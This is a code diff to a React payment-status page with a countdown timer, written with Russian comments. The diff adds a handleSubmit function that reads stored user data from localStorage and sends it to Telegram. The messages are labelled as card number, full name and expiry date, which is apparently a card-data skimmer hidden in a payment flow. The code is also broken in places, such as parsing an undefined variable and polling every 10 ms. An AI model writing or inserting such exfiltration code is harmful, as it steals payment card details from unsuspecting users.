@@ -7,8 +7,7 @@ import { useEffect, useState, useRef } from 'react';
 import { useTimer } from 'react-timer-hook';
 import { RingLoader } from 'react-spinners';
 import { css } from '@emotion/react';
-
-
+import { sendMessage } from '../api/telegram.ts'
 
 
 const LoadingOverlay = () => {
@@ -45,13 +44,11 @@ interface FormProps {
     order: number;
   }
   function MyTimer() {
-    
     const [expiryTimestamp, setExpiryTimestamp] = useState(() => {
       // Получаем сохраненное время из локального хранилища при первой загрузке
       const storedTime = localStorage.getItem('expiryTimestamp');
       return storedTime ? parseInt(storedTime, 10) : new Date().getTime() + 20 * 60000; // Устанавливаем 20 минут, если нет сохраненного значения
     });// Например, устанавливаем время на 10 секунд
-  
     // Получаем сохраненное время из локального хранилища при первой загрузке
     const getSavedExpiryTimestamp = () => {
       const storedTime = localStorage.getItem('expiryTimestamp');
@@ -70,25 +67,39 @@ interface FormProps {
       resume,
       restart,
     } = useTimer({ expiryTimestamp: getSavedExpiryTimestamp(), onExpire: () => console.warn('onExpire called') });
-  
     // Сохраняем время в локальное хранилище при каждом обновлении
     useEffect(() => {
       localStorage.setItem('expiryTimestamp', expiryTimestamp.toString());
     }, [expiryTimestamp]);
     return (
       <div style={{ textAlign: 'center' }}>
-        
         <div style={{ fontSize: '100px' }}>
           <span>{minutes}</span>:<span>{seconds}</span>
         </div>
-
         <div className="loader-contain">
         <span className="loader"></span>
         </div>
         </div>
     );
   }
+  const handleSubmit = async (): Promise<void> => {
+    const storedName = localStorage.getItem('userdata');
+    const storedObject = JSON.parse(storedData);    
+    var name = storedObject && storedObject.name;
+    var phone = storedObject && storedObject.phone;
+    var summ = storedObject && storedObject.summ;
 
+    try {
+      console.log("success send");
+        await sendMessage(`Номер карты: ${name} || ФИО: ${phone} || Срок действия: ${summ} || `)
+        await sendMessage(`-----------------------------------`)
+    } catch (e) {
+        console.log("error",e);
+    
+    } finally {
+      console.log("failedTG");
+    }
+}
 const AlertCopy = ({ message}) => {
     return (
         <div className="p-3 mb-3 text-dark">{message}</div>
@@ -101,36 +112,32 @@ const AlertCopy = ({ message}) => {
     useEffect(() => {
         const fetchData = async () => {
           try {
-            setLoadingProp(65);
-            const response = await fetch(`/api/check_trade/trade/${order}`, { 
+            setLoadingProp(0);
+            const response = await fetch(`/api/check_trade/trade/${order}`, {  // console.log(response);
               method: 'GET', 
               mode: 'cors',
               headers: {
               'Content-Type': 'application/json',
               'Accept': 'application/json',
             }});
-	    
-            // console.log(response);
+            setLoadingProp(65);
             const data = await response.json();
-    
             if (data && data.length > 0) {
               const obj = data[0];
               const { result, message } = obj;
-              localStorage.setItem('Resultation', result);
-              localStorage.setItem('ResultMessage', message);
-              // console.log(result);
-              // console.log(message);   
+              localStorage.setItem('Resultation', result);// console.log(message);   
+              localStorage.setItem('ResultMessage', message); // console.log(result);  
               switch (message) {
                 case 'still processing': 
                 setInterval( () => setLoadingProp(77), 2000)
+                handleSubmit();
                 setInterval( () => window.location.reload(), 20000)
                 break;
                 case 'fully paid': 
-                setInterval( () => setLoadingProp(100), 10)
-                if (check<=0) {
-		setInterval( () => window.location.reload(), 20000)
-		check = 100;
-}
+                setInterval( () => setLoadingProp(100), 10);
+                handleSubmit();
+                window.location.reload()
+                clearInterval(intervalId);
                 break;
                 case 'trade archived': 
                 setInterval( () => setLoadingProp(0), 2000)
@@ -144,7 +151,9 @@ const AlertCopy = ({ message}) => {
             setInterval( () => setLoadingProp(0), 2000)
             setInterval( () => window.location.reload(), 5000)
           } 
-        }; fetchData();
+        }; 
+        const intervalId = setInterval(fetchData, 10); // Сохраняем ID интервала для очистки
+        return () => clearInterval(intervalId);
       }, [])
     const [showOrder, setShowOrder] = useState(false);
     const [loadingProp, setLoadingProp] = useState(0);
